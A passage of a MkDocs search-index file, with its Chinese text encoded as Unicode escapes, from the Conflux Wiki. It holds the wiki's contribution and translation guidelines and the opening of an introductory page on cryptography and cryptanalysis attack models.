\u4e2d\u6ca1\u6709\u7684\u5185\u5bb9\uff0c\u8bf7\u52a1\u5fc5\u52a0\u5165 \u7535\u62a5 \u4e2d\u4ea4\u6d41\uff0c\u5e76\u5728\u4ea4\u6d41\u5b8c\u6bd5\u540e \u5c06\u81ea\u5df1\u60f3\u8981\u5f00\u542f\u7684\u65b0\u7684\u7ae0\u8282\u4ee5\u7b80\u660e\u627c\u8981\u7684\u65b9\u5f0f\u53d1\u8d77\u4e00\u4e2a\u65b0\u7684 issue \uff0c\u4ee5\u4fbf\u4e8e\u7ba1\u7406\u4eba\u5458\u628a\u8fd9\u4e2a\u653e\u5230\u5bf9\u5e94 Project \u7684 In Process \u680f\u4e2d\u3002 \u5728\u4f60\u6210\u4e3a\u56e2\u961f\u6210\u5458\u540e\uff0c\u4f60\u53ef\u4ee5\u81ea\u7531\u5730\u7f16\u5199 Project \u4e2d\u7684\u5185\u5bb9\u3002","title":"\u6ce8\u610f"},{"location":"contribute/before-contributing/","text":"\u8d21\u732e\u4e4b\u524d \u00b6 \u7ef4\u62a4 Conflux Wiki \u5bf9\u4e8e\u4e2a\u4eba\u80fd\u529b\u6ca1\u6709\u592a\u591a\u8981\u6c42\uff0c\u5173\u952e\u662f\u559c\u6b22\u5f00\u6e90\uff0c\u613f\u610f\u82b1\u65f6\u95f4\u505a\uff0c\u628a\u81ea\u5df1\u7684\u6240\u5b66\u4e0e\u4ed6\u4eba\u5206\u4eab\u3002 \u5728\u7ef4\u62a4 Conflux Wiki \u7684\u8fc7\u7a0b\u4e2d\uff0c\u6ca1\u6709\u4efb\u4f55\u6307\u6d3e\u6027\u7684\u4efb\u52a1\uff0c\u60f3\u5199\u4ec0\u4e48\u5c31\u5199\u4ec0\u4e48\uff0c\u89c9\u5f97 Wiki \u54ea\u91cc\u5199\u7684\u4e0d\u597d\u5c31\u5b8c\u5584\u54ea\u91cc\u3002 \u5982\u679c\u89c9\u5f97\u4e4b\u524d\u7684\u4eba\u5199\u5f97\u4e0d\u597d\uff0c\u53ef\u4ee5\u4e0e\u5176\u8ba8\u8bba\uff0c\u5c06\u5176\u6253\u9020\u4e3a\u66f4\u4e3a\u5408\u7406\u7684\u7ed3\u6784\u3002 \u8bf7\u52a1\u5fc5\u5728\u770b\u5b8c\u672c\u7ae0\u8282\u6240\u6709\u5185\u5bb9\u540e\u518d\u5f00\u59cb\u8d21\u732e\u3002","title":"\u8d21\u732e\u4e4b\u524d"},{"location":"contribute/before-contributing/#_1","text":"\u7ef4\u62a4 Conflux Wiki \u5bf9\u4e8e\u4e2a\u4eba\u80fd\u529b\u6ca1\u6709\u592a\u591a\u8981\u6c42\uff0c\u5173\u952e\u662f\u559c\u6b22\u5f00\u6e90\uff0c\u613f\u610f\u82b1\u65f6\u95f4\u505a\uff0c\u628a\u81ea\u5df1\u7684\u6240\u5b66\u4e0e\u4ed6\u4eba\u5206\u4eab\u3002 \u5728\u7ef4\u62a4 Conflux Wiki \u7684\u8fc7\u7a0b\u4e2d\uff0c\u6ca1\u6709\u4efb\u4f55\u6307\u6d3e\u6027\u7684\u4efb\u52a1\uff0c\u60f3\u5199\u4ec0\u4e48\u5c31\u5199\u4ec0\u4e48\uff0c\u89c9\u5f97 Wiki \u54ea\u91cc\u5199\u7684\u4e0d\u597d\u5c31\u5b8c\u5584\u54ea\u91cc\u3002 \u5982\u679c\u89c9\u5f97\u4e4b\u524d\u7684\u4eba\u5199\u5f97\u4e0d\u597d\uff0c\u53ef\u4ee5\u4e0e\u5176\u8ba8\u8bba\uff0c\u5c06\u5176\u6253\u9020\u4e3a\u66f4\u4e3a\u5408\u7406\u7684\u7ed3\u6784\u3002 \u8bf7\u52a1\u5fc5\u5728\u770b\u5b8c\u672c\u7ae0\u8282\u6240\u6709\u5185\u5bb9\u540e\u518d\u5f00\u59cb\u8d21\u732e\u3002","title":"\u8d21\u732e\u4e4b\u524d"},{"location":"contribute/documentation-requirement/","text":"\u8d21\u732e\u6587\u6863\u8981\u6c42 \u00b6 \u5f53\u4f60\u6253\u7b97\u8d21\u732e\u67d0\u90e8\u5206\u7684\u5185\u5bb9\u65f6\uff0c\u4f60\u5e94\u8be5\u5c3d\u91cf\u786e\u4fdd \u6587\u6863\u5185\u5bb9\u6ee1\u8db3\u57fa\u672c\u683c\u5f0f\u8981\u6c42 \u6587\u6863\u7684\u5408\u7406\u6027 \u6587\u6863\u5b58\u50a8\u7684\u683c\u5f0f \u6587\u6863\u5185\u5bb9\u7684\u57fa\u672c\u683c\u5f0f \u00b6 \u8fd9\u91cc\u4e3b\u8981\u662f\u6307 \u4e2d\u6587\u6392\u7248\u6307\u5357 \u4e0e MkDocs \u4f7f\u7528\u8bf4\u660e \u3002\u989d\u5916\u7684\u57fa\u672c\u8981\u6c42\u5982\u4e0b \u4e4b\u540e\u53ef\u80fd\u4f1a\u8003\u8651\u4e3a\u6bb5\u843d\u6807\u9898\u81ea\u52a8\u751f\u6210\u5e8f\u53f7\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u63a8\u8350\u5728\u6bb5\u843d\u6807\u9898\u5904\u589e\u52a0\u5e8f\u53f7\u3002 \u6587\u6863\u7684\u5408\u7406\u6027 \u00b6 \u6240\u8c13\u5408\u7406\u6027\uff0c\u6307\u6240\u7f16\u5199\u7684 \u5185\u5bb9 \u5fc5\u987b\u5177\u6709\u5982\u4e0b\u7684\u7279\u6027 \u7531\u6d45\u5165\u6df1\uff0c\u5185\u5bb9\u7684\u96be\u5ea6\u5e94\u8be5\u5177\u6709\u6e10\u8fdb\u6027\u3002 \u903b\u8f91\u6027\uff0c\u5bf9\u4e8e\u6bcf\u7c7b\u5185\u5bb9\u7684\u64b0\u5199\u5e94\u8be5\u5c3d\u91cf\u5305\u542b\u4ee5\u4e0b\u7684\u5185\u5bb9 \u539f\u7406\uff0c\u8bf4\u660e\u8be5\u5185\u5bb9\u5bf9\u5e94\u7684\u539f\u7406\u3002 \u4f8b\u5b50\uff0c\u7ed9\u51fa 1 ~ 2 \u4e2a\u5178\u578b\u7684\u4f8b\u5b50\u3002 \u9898\u76ee\uff0c\u5728\u8be5\u6807\u9898\u4e0b\uff0c \u53ea\u9700\u8981\u7ed9\u51fa\u9898\u76ee\u540d\u5b57 \u3002 \u6587\u6863\u5b58\u50a8\u7684\u683c\u5f0f \u00b6 \u5bf9\u4e8e\u6bcf\u7c7b\u8981\u7f16\u5199\u7684\u5185\u5bb9\uff0c\u5bf9\u5e94\u7684\u6587\u6863\u5e94\u8be5\u5b58\u50a8\u5728\u5408\u9002\u7684\u76ee\u5f55\u4e0b figure\uff0c\u5b58\u50a8\u7f16\u5199\u6587\u6863\u65f6\u6240\u4f7f\u7528\u7684\u56fe\u7247\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u56fe\u7247\u8981\u653e\u5728\u672c\u5730\u6587\u4ef6\u5939\uff0c\u907f\u514d\u5f15\u7528\u5916\u94fe\u3002\u8bf7\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84 ./figure \u6765\u7d22\u5f15\u56fe\u7247\u3002 \u6587\u4ef6\u540d\u8bf7\u52a1\u5fc5\u90fd\u5c0f\u5199\uff0c\u4ee5 - \u5206\u5272\uff0c \u5982 file-name","title":"\u8d21\u732e\u6587\u6863\u8981\u6c42"},{"location":"contribute/documentation-requirement/#_1","text":"\u5f53\u4f60\u6253\u7b97\u8d21\u732e\u67d0\u90e8\u5206\u7684\u5185\u5bb9\u65f6\uff0c\u4f60\u5e94\u8be5\u5c3d\u91cf\u786e\u4fdd \u6587\u6863\u5185\u5bb9\u6ee1\u8db3\u57fa\u672c\u683c\u5f0f\u8981\u6c42 \u6587\u6863\u7684\u5408\u7406\u6027 \u6587\u6863\u5b58\u50a8\u7684\u683c\u5f0f","title":"\u8d21\u732e\u6587\u6863\u8981\u6c42"},{"location":"contribute/documentation-requirement/#_2","text":"\u8fd9\u91cc\u4e3b\u8981\u662f\u6307 \u4e2d\u6587\u6392\u7248\u6307\u5357 \u4e0e MkDocs \u4f7f\u7528\u8bf4\u660e \u3002\u989d\u5916\u7684\u57fa\u672c\u8981\u6c42\u5982\u4e0b \u4e4b\u540e\u53ef\u80fd\u4f1a\u8003\u8651\u4e3a\u6bb5\u843d\u6807\u9898\u81ea\u52a8\u751f\u6210\u5e8f\u53f7\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u63a8\u8350\u5728\u6bb5\u843d\u6807\u9898\u5904\u589e\u52a0\u5e8f\u53f7\u3002","title":"\u6587\u6863\u5185\u5bb9\u7684\u57fa\u672c\u683c\u5f0f"},{"location":"contribute/documentation-requirement/#_3","text":"\u6240\u8c13\u5408\u7406\u6027\uff0c\u6307\u6240\u7f16\u5199\u7684 \u5185\u5bb9 \u5fc5\u987b\u5177\u6709\u5982\u4e0b\u7684\u7279\u6027 \u7531\u6d45\u5165\u6df1\uff0c\u5185\u5bb9\u7684\u96be\u5ea6\u5e94\u8be5\u5177\u6709\u6e10\u8fdb\u6027\u3002 \u903b\u8f91\u6027\uff0c\u5bf9\u4e8e\u6bcf\u7c7b\u5185\u5bb9\u7684\u64b0\u5199\u5e94\u8be5\u5c3d\u91cf\u5305\u542b\u4ee5\u4e0b\u7684\u5185\u5bb9 \u539f\u7406\uff0c\u8bf4\u660e\u8be5\u5185\u5bb9\u5bf9\u5e94\u7684\u539f\u7406\u3002 \u4f8b\u5b50\uff0c\u7ed9\u51fa 1 ~ 2 \u4e2a\u5178\u578b\u7684\u4f8b\u5b50\u3002 \u9898\u76ee\uff0c\u5728\u8be5\u6807\u9898\u4e0b\uff0c \u53ea\u9700\u8981\u7ed9\u51fa\u9898\u76ee\u540d\u5b57 \u3002","title":"\u6587\u6863\u7684\u5408\u7406\u6027"},{"location":"contribute/documentation-requirement/#_4","text":"\u5bf9\u4e8e\u6bcf\u7c7b\u8981\u7f16\u5199\u7684\u5185\u5bb9\uff0c\u5bf9\u5e94\u7684\u6587\u6863\u5e94\u8be5\u5b58\u50a8\u5728\u5408\u9002\u7684\u76ee\u5f55\u4e0b figure\uff0c\u5b58\u50a8\u7f16\u5199\u6587\u6863\u65f6\u6240\u4f7f\u7528\u7684\u56fe\u7247\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u56fe\u7247\u8981\u653e\u5728\u672c\u5730\u6587\u4ef6\u5939\uff0c\u907f\u514d\u5f15\u7528\u5916\u94fe\u3002\u8bf7\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84 ./figure \u6765\u7d22\u5f15\u56fe\u7247\u3002 \u6587\u4ef6\u540d\u8bf7\u52a1\u5fc5\u90fd\u5c0f\u5199\uff0c\u4ee5 - \u5206\u5272\uff0c \u5982 file-name","title":"\u6587\u6863\u5b58\u50a8\u7684\u683c\u5f0f"},{"location":"contribute/translation/","text":"\u7ffb\u8bd1 \u00b6 \u76ee\u524d\uff0c\u591a\u8bed\u8a00\u7684\u652f\u6301\u4e3b\u8981\u501f\u9274\u4e86 fastapi \u7684\u5904\u7406\u65b9\u5f0f\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u7ffb\u8bd1\u7684\u8fc7\u7a0b\u4e2d\u6211\u4eec\u53ea\u9700\u8981\u786e\u4fdd\u4e0d\u540c\u8bed\u8a00\u5728\u6587\u4ef6\u7ea7\u522b\u4e0a\u4fdd\u6301\u4e00\u81f4\u3002\u5bf9\u4e8e\u6587\u4ef6\u4e2d\u5177\u4f53\u7684\u5185\u5bb9\uff0c\u4e0d\u5fc5\u8fc7\u4e8e\u62d8\u8c28\uff0c\u53ea\u9700\u610f\u601d\u8868\u8fbe\u4e00\u81f4\u5373\u53ef\u3002 \u5b8c\u5584\u5df2\u6709\u8bed\u8a00 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5\u82f1\u8bed\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u786e\u5b9a\u82f1\u8bed\u5bf9\u5e94\u7684 2 \u4e2a\u5b57\u6bcd\u7684\u4ee3\u7801\uff0c\u901a\u8fc7\u67e5\u8be2https://en.wikipedia.org/wiki/List_of_ISO_639-1_codes\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u5bf9\u5e94\u7684\u4ee3\u7801\u4e3a en \u3002 \u5728\u786e\u5b9a\u4e86\u4ee3\u7801\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u77e5\u9053\u8be5\u8bed\u8a00\u7684\u6587\u6863\u6240\u5728\u7684\u76ee\u5f55\uff0c\u5373 docs/en \u3002 \u5047\u8bbe\u6211\u4eec\u60f3\u8981\u7ffb\u8bd1\u7684\u6587\u6863\u4e3a docs/zh/docs/contribute/translation.md \u3002\u90a3\u4e48\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u8be5\u6587\u4ef6\u62f7\u8d1d\u5230 docs/en/docs/contribute/translation.md \u3002\u540c\u65f6\uff0c\u5982\u679c\u8be5\u6587\u4ef6\u4f9d\u8d56\u4e86\u56fe\u7247\uff0c\u6211\u4eec\u4e5f\u9700\u8981\u62f7\u8d1d\u5bf9\u5e94\u7684\u56fe\u7247\u6587\u4ef6\u5939\u5230\u76f8\u5e94\u7684\u76ee\u5f55\u4e0b\u3002 \u7136\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u6253\u5f00\u4e2d\u6587\u5bf9\u5e94\u7684 mkdocs.yml\uff0c\u5373 docs/zh/docs/mkdocs.yml \uff0c\u627e\u5230\u6211\u4eec\u60f3\u8981\u7ffb\u8bd1\u7684\u6587\u4ef6\u6240\u5728\u7684\u4f4d\u7f6e\uff0c\u6bd4\u5982 nav : - Start : - index.md - discussion.md - contribute/before-contributing.md - contribute/basic-contribute-approach.md - contribute/documentation-requirement.md - contribute/translation.md \u90a3\u6211\u4eec\u5e94\u8be5\u5728\u82f1\u8bed\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u76f8\u5e94\u7684\u5c42\u6b21\u7ed3\u6784\u5904\u6dfb\u52a0\u5bf9\u5e94\u7684\u6587\u4ef6\u3002 nav : - Start : - index.md - discussion.md - contribute/before-contributing.md - contribute/basic-contribute-approach.md - contribute/documentation-requirement.md - contribute/translation.md \u7136\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u7ffb\u8bd1\u3002 \u6700\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 python3 scripts/doc.py live en \u6765\u9884\u89c8\u4fee\u6539\u540e\u7684\u5185\u5bb9\u3002 \u65b0\u589e\u5168\u65b0\u8bed\u8a00 \u00b6 \u5982\u679c\u4f60\u6253\u7b97\u6dfb\u52a0\u4e00\u79cd\u5c1a\u672a\u8fdb\u884c\u4efb\u4f55\u7ffb\u8bd1\u7684\u8bed\u8a00\uff0c\u6bd4\u5982\u8bf4\u65e5\u8bed\uff08 jp \uff09\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 python3 scripts / doc . py new - lang jp \u6765\u8fdb\u884c\u521d\u59cb\u5316\u3002\u6b64\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u6309\u7167\u4e0a\u4e00\u5c0f\u8282\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u8d21\u732e\u4e86\u3002","title":"\u7ffb\u8bd1"},{"location":"contribute/translation/#_1","text":"\u76ee\u524d\uff0c\u591a\u8bed\u8a00\u7684\u652f\u6301\u4e3b\u8981\u501f\u9274\u4e86 fastapi \u7684\u5904\u7406\u65b9\u5f0f\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u7ffb\u8bd1\u7684\u8fc7\u7a0b\u4e2d\u6211\u4eec\u53ea\u9700\u8981\u786e\u4fdd\u4e0d\u540c\u8bed\u8a00\u5728\u6587\u4ef6\u7ea7\u522b\u4e0a\u4fdd\u6301\u4e00\u81f4\u3002\u5bf9\u4e8e\u6587\u4ef6\u4e2d\u5177\u4f53\u7684\u5185\u5bb9\uff0c\u4e0d\u5fc5\u8fc7\u4e8e\u62d8\u8c28\uff0c\u53ea\u9700\u610f\u601d\u8868\u8fbe\u4e00\u81f4\u5373\u53ef\u3002","title":"\u7ffb\u8bd1"},{"location":"contribute/translation/#_2","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5\u82f1\u8bed\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u786e\u5b9a\u82f1\u8bed\u5bf9\u5e94\u7684 2 \u4e2a\u5b57\u6bcd\u7684\u4ee3\u7801\uff0c\u901a\u8fc7\u67e5\u8be2https://en.wikipedia.org/wiki/List_of_ISO_639-1_codes\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u5bf9\u5e94\u7684\u4ee3\u7801\u4e3a en \u3002 \u5728\u786e\u5b9a\u4e86\u4ee3\u7801\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u77e5\u9053\u8be5\u8bed\u8a00\u7684\u6587\u6863\u6240\u5728\u7684\u76ee\u5f55\uff0c\u5373 docs/en \u3002 \u5047\u8bbe\u6211\u4eec\u60f3\u8981\u7ffb\u8bd1\u7684\u6587\u6863\u4e3a docs/zh/docs/contribute/translation.md \u3002\u90a3\u4e48\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u8be5\u6587\u4ef6\u62f7\u8d1d\u5230 docs/en/docs/contribute/translation.md \u3002\u540c\u65f6\uff0c\u5982\u679c\u8be5\u6587\u4ef6\u4f9d\u8d56\u4e86\u56fe\u7247\uff0c\u6211\u4eec\u4e5f\u9700\u8981\u62f7\u8d1d\u5bf9\u5e94\u7684\u56fe\u7247\u6587\u4ef6\u5939\u5230\u76f8\u5e94\u7684\u76ee\u5f55\u4e0b\u3002 \u7136\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u6253\u5f00\u4e2d\u6587\u5bf9\u5e94\u7684 mkdocs.yml\uff0c\u5373 docs/zh/docs/mkdocs.yml \uff0c\u627e\u5230\u6211\u4eec\u60f3\u8981\u7ffb\u8bd1\u7684\u6587\u4ef6\u6240\u5728\u7684\u4f4d\u7f6e\uff0c\u6bd4\u5982 nav : - Start : - index.md - discussion.md - contribute/before-contributing.md - contribute/basic-contribute-approach.md - contribute/documentation-requirement.md - contribute/translation.md \u90a3\u6211\u4eec\u5e94\u8be5\u5728\u82f1\u8bed\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u76f8\u5e94\u7684\u5c42\u6b21\u7ed3\u6784\u5904\u6dfb\u52a0\u5bf9\u5e94\u7684\u6587\u4ef6\u3002 nav : - Start : - index.md - discussion.md - contribute/before-contributing.md - contribute/basic-contribute-approach.md - contribute/documentation-requirement.md - contribute/translation.md \u7136\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u7ffb\u8bd1\u3002 \u6700\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 python3 scripts/doc.py live en \u6765\u9884\u89c8\u4fee\u6539\u540e\u7684\u5185\u5bb9\u3002","title":"\u5b8c\u5584\u5df2\u6709\u8bed\u8a00"},{"location":"contribute/translation/#_3","text":"\u5982\u679c\u4f60\u6253\u7b97\u6dfb\u52a0\u4e00\u79cd\u5c1a\u672a\u8fdb\u884c\u4efb\u4f55\u7ffb\u8bd1\u7684\u8bed\u8a00\uff0c\u6bd4\u5982\u8bf4\u65e5\u8bed\uff08 jp \uff09\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 python3 scripts / doc . py new - lang jp \u6765\u8fdb\u884c\u521d\u59cb\u5316\u3002\u6b64\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u6309\u7167\u4e0a\u4e00\u5c0f\u8282\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u8d21\u732e\u4e86\u3002","title":"\u65b0\u589e\u5168\u65b0\u8bed\u8a00"},{"location":"crypto/introduction/","text":"\u5bc6\u7801\u5b66\u7b80\u4ecb \u00b6 \u5bc6\u7801\u5b66\uff08Cryptography\uff09\u4e00\u822c\u53ef\u5206\u4e3a\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\u3002 \u5176\u4e2d\uff0c\u53e4\u5178\u5bc6\u7801\u5b66\uff0c\u4f5c\u4e3a\u4e00\u79cd\u5b9e\u7528\u6027\u827a\u672f\u5b58\u5728\uff0c\u5176\u7f16\u7801\u548c\u7834\u8bd1\u901a\u5e38\u4f9d\u8d56\u4e8e\u8bbe\u8ba1\u8005\u548c\u654c\u624b\u7684\u521b\u9020\u529b\u4e0e\u6280\u5de7\uff0c\u5e76\u6ca1\u6709\u5bf9\u5bc6\u7801\u5b66\u539f\u4ef6\u8fdb\u884c\u6e05\u6670\u7684\u5b9a\u4e49\u3002\u53e4\u5178\u5bc6\u7801\u5b66\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a \u5355\u8868\u66ff\u6362\u52a0\u5bc6\uff08Monoalphabetic Cipher\uff09 \u591a\u8868\u66ff\u6362\u52a0\u5bc6\uff08Polyalphabetic Cipher\uff09 \u5947\u5947\u602a\u602a\u7684\u52a0\u5bc6\u65b9\u5f0f \u800c\u73b0\u4ee3\u5bc6\u7801\u5b66\u5219\u8d77\u6e90\u4e8e 20 \u4e16\u7eaa\u4e2d\u540e\u671f\u51fa\u73b0\u7684\u5927\u91cf\u76f8\u5173\u7406\u8bba\uff0c1949 \u5e74\u9999\u519c\uff08C. E. Shannon\uff09\u53d1\u8868\u4e86\u9898\u4e3a\u300a\u4fdd\u5bc6\u7cfb\u7edf\u7684\u901a\u4fe1\u7406\u8bba\u300b\u7684\u7ecf\u5178\u8bba\u6587\u6807\u5fd7\u7740\u73b0\u4ee3\u5bc6\u7801\u5b66\u7684\u5f00\u59cb\u3002\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a \u5bf9\u79f0\u52a0\u5bc6\uff08Symmetric Cryptography\uff09\uff0c\u4ee5 DES\uff0cAES\uff0cRC4 \u4e3a\u4ee3\u8868\u3002 \u975e\u5bf9\u79f0\u52a0\u5bc6\uff08Asymmetric Cryptography\uff09\uff0c\u4ee5 RSA\uff0cElGamal\uff0c\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u4e3a\u4ee3\u8868\u3002 \u54c8\u5e0c\u51fd\u6570\uff08Hash Function\uff09\uff0c\u4ee5 MD5\uff0cSHA-1\uff0cSHA-512 \u7b49\u4e3a\u4ee3\u8868\u3002 \u6570\u5b57\u7b7e\u540d\uff08Digital Signature\uff09\uff0c\u4ee5 RSA \u7b7e\u540d\uff0cElGamal \u7b7e\u540d\uff0cDSA \u7b7e\u540d\u4e3a\u4ee3\u8868\u3002 \u5176\u4e2d\uff0c\u5bf9\u79f0\u52a0\u5bc6\u4f53\u5236\u4e3b\u8981\u5206\u4e3a\u4e24\u79cd\u65b9\u5f0f\uff1a \u5206\u7ec4\u5bc6\u7801\uff08Block Cipher\uff09\uff0c\u53c8\u79f0\u4e3a\u5757\u5bc6\u7801\u3002 \u5e8f\u5217\u5bc6\u7801\uff08Stream Cipher\uff09\uff0c\u53c8\u79f0\u4e3a\u6d41\u5bc6\u7801\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u5bc6\u7801\u8bbe\u8ba1\u8005\u7684\u6839\u672c\u76ee\u6807\u662f\u4fdd\u969c\u4fe1\u606f\u53ca\u4fe1\u606f\u7cfb\u7edf\u7684 \u673a\u5bc6\u6027\uff08Confidentiality\uff09 \u5b8c\u6574\u6027\uff08Integrity\uff09 \u53ef\u7528\u6027\uff08Availability\uff09 \u8ba4\u8bc1\u6027\uff08Authentication\uff09 \u4e0d\u53ef\u5426\u8ba4\u6027\uff08Non-repudiation\uff09 \u5176\u4e2d\uff0c\u524d\u4e09\u8005\u88ab\u79f0\u4e3a\u4fe1\u606f\u5b89\u5168\u7684 CIA \u4e09\u8981\u7d20 \u3002 \u800c\u5bf9\u4e8e\u5bc6\u7801\u7834\u89e3\u8005\u6765\u8bf4\uff0c\u4e00\u822c\u662f\u8981\u60f3\u529e\u6cd5\u8bc6\u522b\u51fa\u5bc6\u7801\u7b97\u6cd5\uff0c\u7136\u540e\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u6216\u8005\u5229\u7528\u5bc6\u7801\u4f53\u5236\u7684\u6f0f\u6d1e\u8fdb\u884c\u7834\u89e3\u3002\u5f53\u7136\uff0c\u4e5f\u6709\u53ef\u80fd\u901a\u8fc7\u6784\u9020\u865a\u5047\u7684\u54c8\u5e0c\u503c\u6216\u8005\u6570\u5b57\u7b7e\u540d\u6765\u7ed5\u8fc7\u76f8\u5e94\u7684\u68c0\u6d4b\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u90fd\u4f1a\u5047\u8bbe\u653b\u51fb\u8005\u5df2\u77e5\u5f85\u7834\u89e3\u7684\u5bc6\u7801\u4f53\u5236\uff0c\u800c\u653b\u51fb\u7c7b\u578b\u901a\u5e38\u5206\u4e3a\u4ee5\u4e0b\u56db\u79cd\uff1a \u653b\u51fb\u7c7b\u578b \u8bf4\u660e \u552f\u5bc6\u6587\u653b\u51fb \u53ea\u62e5\u6709\u5bc6\u6587 \u5df2\u77e5\u660e\u6587\u653b\u51fb \u62e5\u6709\u5bc6\u6587\u4e0e\u5bf9\u5e94\u7684\u660e\u6587 \u9009\u62e9\u660e\u6587\u653b\u51fb \u62e5\u6709\u52a0\u5bc6\u6743\u9650\uff0c\u80fd\u591f\u5bf9\u660e\u6587\u52a0\u5bc6\u540e\u83b7\u5f97\u76f8\u5e94\u5bc6\u6587 \u9009\u62e9\u5bc6\u6587\u653b\u51fb \u62e5\u6709\u89e3\u5bc6\u6743\u9650\uff0c\u80fd\u591f\u5bf9\u5bc6\u6587\u89e3\u5bc6\u540e\u83b7\u5f97\u76f8\u5e94\u660e\u6587 Note \u6ce8\uff1a\u4e4b\u524d\u5728\u8fd9\u91cc\u66fe\u5199\u8fc7\u8fd9\u4e9b\u653b\u51fb\u5e38\u89c1\u7684\u573a\u666f\uff0c\u968f\u7740\u4e0d\u65ad\u5730\u5b66\u4e60\uff0c\u6e10\u6e10\u610f\u8bc6\u5230\u8fd9\u4e9b\u653b\u51fb\u7c7b\u578b\u4fa7\u91cd\u63cf\u8ff0\u653b\u51fb\u8005\u7684\u80fd\u529b\uff0c\u6709\u53ef\u80fd\u9002\u7528\u4e8e\u5404\u79cd\u5404\u6837\u7684\u573a\u666f\u3002\u6545\u8fdb\u884c\u4fee\u6b63\u3002 \u8fd9\u91cc\u63a8\u8350\u4e00\u4e9b\u8d44\u6599 \u53ef\u6c57\u5b66\u9662\u516c\u5f00\u8bfe \u6df1\u5165\u6d45\u51fa\u5bc6\u7801\u5b66\u2014\u2014\u5e38\u7528\u52a0\u5bc6\u6280\u672f\u539f\u7406\u4e0e\u5e94\u7528 https://cryptopals.com/ \uff0c\u4e00\u5806\u5bc6\u7801\u5b66\u7684\u7ec3\u4e60\u9898\u76ee\u3002 Note \u63a8\u8350\u5728\u770b\u5b8c\u516c\u5f00\u8bfe\u7684\u60c5\u51b5\u4e0b\uff0c\u4ee5\u53ca\u7b80\u5355\u770b\u770b\u7535\u5b50\u4e66\u7684\u60c5\u51b5\u4e0b\u5728\u8003\u8651\u662f\u5426\u8981\u8d2d\u4e70\u4e66\uff0c\u56e0\u4e3a\u4e66\u4e70\u56de\u6765\u4e00\u822c\u90fd\u88ab\u95f2\u7f6e\u8d77\u6765\u4e86\u3002 \u53c2\u8003 \u00b6 \u7ef4\u57fa\u767e\u79d1-\u5bc6\u7801\u5b66 Info \u672c\u8282\u5927\u90e8\u5206\u5b9a\u4e49\u4e0e\u4f8b\u5b50\u53c2\u8003\u4e86\u7ef4\u57fa\u767e\u79d1\u3002","title":"\u5bc6\u7801\u5b66\u7b80\u4ecb"},{"location":"crypto/introduction/#_1","text":"\u5bc6\u7801\u5b66\uff08Cryptography\uff09\u4e00\u822c\u53ef\u5206\u4e3a\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\u3002 \u5176\u4e2d\uff0c\u53e4\u5178\u5bc6\u7801\u5b66\uff0c\u4f5c\u4e3a\u4e00\u79cd\u5b9e\u7528\u6027\u827a\u672f\u5b58\u5728\uff0c\u5176\u7f16\u7801\u548c\u7834\u8bd1\u901a\u5e38\u4f9d\u8d56\u4e8e\u8bbe\u8ba1\u8005\u548c\u654c\u624b\u7684\u521b\u9020\u529b\u4e0e\u6280\u5de7\uff0c\u5e76\u6ca1\u6709\u5bf9\u5bc6\u7801\u5b66\u539f\u4ef6\u8fdb\u884c\u6e05\u6670\u7684\u5b9a\u4e49\u3002\u53e4\u5178\u5bc6\u7801\u5b66\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a \u5355\u8868\u66ff\u6362\u52a0\u5bc6\uff08Monoalphabetic Cipher\uff09 \u591a\u8868\u66ff\u6362\u52a0\u5bc6\uff08Polyalphabetic Cipher\uff09 \u5947\u5947\u602a\u602a\u7684\u52a0\u5bc6\u65b9\u5f0f \u800c\u73b0\u4ee3\u5bc6\u7801\u5b66\u5219\u8d77\u6e90\u4e8e 20 \u4e16\u7eaa\u4e2d\u540e\u671f\u51fa\u73b0\u7684\u5927\u91cf\u76f8\u5173\u7406\u8bba\uff0c1949 